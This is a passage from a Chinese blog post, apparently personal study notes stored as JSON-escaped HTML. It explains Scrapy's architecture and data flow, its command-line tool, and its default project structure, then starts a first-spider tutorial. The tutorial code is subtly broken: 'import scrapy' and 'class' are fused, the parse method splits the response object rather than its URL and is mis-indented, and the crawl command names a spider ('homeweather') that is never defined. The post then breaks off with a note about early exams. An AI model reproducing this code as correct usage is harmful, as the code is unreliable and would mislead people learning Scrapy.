会将其交给 Downloader 进行下载，下载之后会交给 Spider 进行分析，Spider 分析出来的结果有两种：一种是需要进一步抓取的链接，例如之前分析的 “下一页” 的链接，这些东西会被传回 Scheduler；另一种是需要保存的数据，它们则被送到 Item Pipeline 那里，那是对数据进行后期处理（详细分析、过滤、存储等）的地方。另外，在数据流动的通道里还可以安装各种中间件，进行必要的处理。</p>\n<p>Scrapy 中的数据流由执行引擎控制，其过程如下:</p>\n<ol>\n<li>引擎打开一个网站 (open a domain)，找到处理该网站的 Spider 并向该 spider 请求第一个要爬取的 URL (s)。</li>\n<li>引擎从 Spider 中获取到第一个要爬取的 URL 并在调度器 (Scheduler) 以 Request 调度。</li>\n<li>引擎向调度器请求下一个要爬取的 URL。</li>\n<li>调度器返回下一个要爬取的 URL 给引擎，引擎将 URL 通过下载中间件 (请求 (request) 方向) 转发给下载器 (Downloader)。</li>\n<li>一旦页面下载完毕，下载器生成一个该页面的 Response, 并将其通过下载中间件 (返回 (response) 方向) 发送给引擎。</li>\n<li>引擎从下载器中接收到 Response 并通过 Spider 中间件 (输入方向) 发送给 Spider 处理。</li>\n<li>Spider 处理 Response 并返回爬取到的 Item 及 (跟进的) 新的 Request 给引擎。</li>\n<li>引擎将 (Spider 返回的) 爬取到的 Item 给 Item Pipeline，将 (Spider 返回的) Request 给调度器。</li>\n<li>(从第二步) 重复直到调度器中没有更多地 request，引擎关闭该网站</li>\n</ol>\n</font>\n<h2 id=\"scrapy命令行工具\"><a class=\"anchor\" href=\"#scrapy命令行工具\">#</a> Scrapy 命令行工具</h2>\n<font color=\"green\">\n<p>Scrapy 是通过 scrapy 命令行工具进行控制的。这里我们称之为 “Scrapy tool” 以用来和子命令进行区分。对于子命令，我们称为 “command” 或者 “Scrapy commands”。Scrapy tool 针对不同的目的提供了多个命令，每个命令支持不同的参数和选项</p>\n</font>\n<h2 id=\"默认的scrapy-项目结构\"><a class=\"anchor\" href=\"#默认的scrapy-项目结构\">#</a> 默认的 Scrapy 项目结构</h2>\n<font color=\"DeepSkyBlue\">\n<p>在开始对命令行工具以及子命令的探索前，让我们首先了解一下 Scrapy 的项目的目录结构。虽然可以被修改，但所有的 Scrapy 项目默认有类似于下边的文件结构:</p>\n<pre><code>scrapy.cfg\n    myproject/\n        __init__.py\n        items.py\n        middlewares.py\n        pipelines.py\n        settings.py\n        spiders/\n            __init__.py\n            spider1.py\n            spider2.py\n            ...\n</code></pre>\n<ol>\n<li>scrapy.cfg<br />\n 存放的目录被认为是项目的根目录。该文件中包含 python 模块名的字段定义了项目的设置。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2l0ZW1zLnB5\">items.py</span><br />\n 该文件中包含了 scrapy 数据容器模型代码。<br />\nItem 对象是种简单的容器，保存了爬取到得数据。其提供了类似于词典 (dictionary-like) 的 API 以及用于声明可用字段的简单语法。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL21pZGRsZXdhcmVzLnB5\">middlewares.py</span><br />\n 该文件中包含下载器中间件和爬虫中间件模型代码。<br />\n下载器中间件是介于 Scrapy 的 request/response 处理的钩子框架。是用于全局修改 Scrapy request 和 response 的一个轻量、底层的系统。<br />\n爬虫中间件是介入到 Scrapy 的 spider 处理机制的钩子框架，您可以添加代码来处理发送给 Spiders 的 response 及 spider 产生的 item 和 request。。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3BpcGVsaW5lcy5weQ==\">pipelines.py</span><br />\n 每个管道组件是实现了简单方法的 Python 类。<br />\n他们接收到 Item 并通过它执行一些行为，同时也决定此 Item 是否继续通过后续的管道组件，或是被丢弃而不再进行处理。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3NldHRpbmdzLnB5\">settings.py</span><br />\nScrapy 设定 (settings) 提供了定制 Scrapy 组件的方法。<br />\n您可以控制包括核心 (core)，插件 (extension)，pipeline 及 spider 组件。</li>\n</ol>\n</font>\n<h1 id=\"编写第一个scrapy爬虫\"><a class=\"anchor\" href=\"#编写第一个scrapy爬虫\">#</a> 编写第一个 Scrapy 爬虫</h1>\n<font color=\"BlueViolet\">\n<p>任务:</p>\n<ol>\n<li>创建一个 Scrapy 项目</li>\n<li>定义提取的 Item</li>\n<li>编写爬取网站的 spider 并提取 Item</li>\n<li>编写 Item Pipeline 来存储提取到的 Item (即数据)</li>\n</ol>\n</font>\n<h2 id=\"创建项目\"><a class=\"anchor\" href=\"#创建项目\">#</a> 创建项目</h2>\n<font color=\"BlueViolet\">\n<p>在开始爬取之前，您必须创建一个新的 Scrapy 项目。<br />\n进入您打算存储代码的目录中，运行下列命令: <code>scrapy startproject tutorial</code> <br />\n 该命令将会创建包含下列内容的 tutorial 目录:</p>\n<pre><code>tutorial/\n    scrapy.cfg\n    tutorial/\n        __init__.py\n        items.py\n        pipelines.py\n        settings.py\n        spiders/\n            __init__.py\n            ...\n</code></pre>\n<p>这些文件分别是:</p>\n<ul>\n<li>scrapy.cfg: 项目的配置文件</li>\n<li>tutorial/: 该项目的 python 模块。之后您将在此加入代码。</li>\n<li>tutorial/items.py: 项目中的 item 文件。</li>\n<li>tutorial/pipelines.py: 项目中的 pipelines 文件。</li>\n<li>tutorial/settings.py: 项目的设置文件。</li>\n<li>tutorial/spiders/: 放置 spider 代码的目录</li>\n</ul>\n</font>\n<h2 id=\"定义item\"><a class=\"anchor\" href=\"#定义item\">#</a> 定义 Item</h2>\n<font color=\"BlueViolet\">\n<p>Item 是保存爬取到的数据的容器；其使用方法和 python 字典类似，并且提供了额外保护机制来避免拼写错误导致的未定义字段错误。<br />\n类似在 ORM 中做的一样，您可以通过创建一个 scrapy.Item 类，并且定义类型为 scrapy.Field 的类属性来定义一个 Item。(如果不了解 ORM, 不用担心，您会发现这个步骤非常简单)<br />\n 首先根据需要从 dmoz.org 获取到的数据对 item 进行建模。我们需要从 dmoz 中获取名字，url，以及网站的描述。对此，在 item 中定义相应的字段。编辑 tutorial 目录中的 items.py 文件。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>items<span class=\"token punctuation\">.</span>py</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> scrapyclass </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>DmozItem<span class=\"token punctuation\">(</span>scrapy<span class=\"token punctuation\">.</span>Item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    title<span class=\"token operator\">=</span>scrapy<span class=\"token punctuation\">.</span>Field<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    link<span class=\"token operator\">=</span>scrapy<span class=\"token punctuation\">.</span>Field<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    desc<span class=\"token operator\">=</span>scrapy<span class=\"token punctuation\">.</span>Field<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>代码一开始这看起来可能有点复杂，但是通过定义 item，您可以很方便的使用 Scrapy 的其他方法。而这些方法需要知道您的 item 的定义。</p>\n</font>\n<h2 id=\"spider爬虫\"><a class=\"anchor\" href=\"#spider爬虫\">#</a> Spider 爬虫</h2>\n<font color=\"BlueViolet\">\n<p>Spider 是用户编写用于从单个网站 (或者一些网站) 爬取数据的类。<br />\n其包含了一个用于下载的初始 URL，如何跟进网页中的链接以及如何分析页面中的内容，提取生成 item 的方法。</p>\n<p>为了创建一个 Spider，您必须继承 scrapy.Spider 类，且定义以下三个属性:</p>\n<ul>\n<li>name: 用于区别 Spider。该名字必须是唯一的，您不可以为不同的 Spider 设定相同的名字。</li>\n<li>start_urls: 包含了 Spider 在启动时进行爬取的 url 列表。因此，第一个被获取到的页面将是其中之一。后续的 URL 则从初始的 URL 获取到的数据中提取。</li>\n<li>parse () 是 spider 的一个方法。被调用时，每个初始 URL 完成下载后生成的 Response 对象将会作为唯一的参数传递给该函数。该方法负责解析返回的数据 (response data)，提取数据 (生成 item) 以及生成需要进一步处理的 URL 的 Request 对象。</li>\n</ul>\n<p>也可以使用命令行创建一个 Spider。比如要生成 Quotes 这个 Spider，可以执行如下命令：<br />\n <code>cd 项目目录</code> <br />\n <code>scrapy genspider quotes quotes.toscrape.com</code> <br />\n 语法格式<br />\n <code>scrapy genspider [options] &lt;name&gt; &lt;domain&gt;</code></p>\n<p>以下为我们的第一个 Spider 代码，保存在 tutorial/spiders 目录下的 dmoz_spider.py 文件中，如 Code 3-21 所示:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*-coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> scrapyclass </pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>DmozSpider<span class=\"token punctuation\">(</span>scrapy<span class=\"token punctuation\">.</span>Spider<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    name <span class=\"token operator\">=</span> <span class=\"token string\">'dmoz'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    allowed_domains <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'dmoz.org'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    start_urls <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'http://www.dmoz.org/Computers/Programming/Langurages/Python/Books'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string\">'http://www.dmoz.org/Computers/Programming/Langurages/Python/Resources'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    filename<span class=\"token operator\">=</span>response<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span><span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">)</span></pre></td></tr></table></figure></font>\n<h2 id=\"爬虫爬取\"><a class=\"anchor\" href=\"#爬虫爬取\">#</a> 爬虫爬取</h2>\n<font color=\"BlueViolet\">\n<p>进入项目的根目录，执行下列命令启动 spider: <code>scrapy crawl homeweather</code></p>\n</font>\n<h2 id=\"紧急\"><a class=\"anchor\" href=\"#紧急\">#</a> 紧急</h2>\n<p>学校要提前放假，考试也提前了。。<br />\n抓紧时间备考了</p>\n<p>考试后再总结</p>\n",
            "tags": [
                "python",
                "scrapy"
            ]
        }
    ]
}